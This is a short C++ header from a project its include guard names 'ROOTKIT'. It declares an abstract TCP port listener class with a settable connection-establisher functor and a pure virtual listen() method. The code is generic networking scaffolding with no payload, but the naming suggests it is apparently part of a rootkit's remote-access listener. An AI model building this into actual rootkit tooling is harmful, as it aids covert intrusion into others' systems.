//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_BASIC_TCP_PORT_LISTENER_H
#define ROOTKIT_BASIC_TCP_PORT_LISTENER_H

#include "../basic_client_handler.h"

#include <memory>
#include <utility>

class basic_tcp_port_listener {
public:
    struct basic_connection_establisher {
        virtual std::unique_ptr<basic_client_handler> operator()() = 0;
    };

protected:
    std::unique_ptr<basic_connection_establisher> accept_new_connection = nullptr;

public:

    void setConnectionEstablisher(std::unique_ptr<basic_connection_establisher> &&connectionEstablisher) {
//        accept_new_connection.reset(connectionEstablisher.release());
        accept_new_connection = std::move(connectionEstablisher);
    }

    virtual void listen() = 0;
};

#endif //ROOTKIT_BASIC_TCP_PORT_LISTENER_H
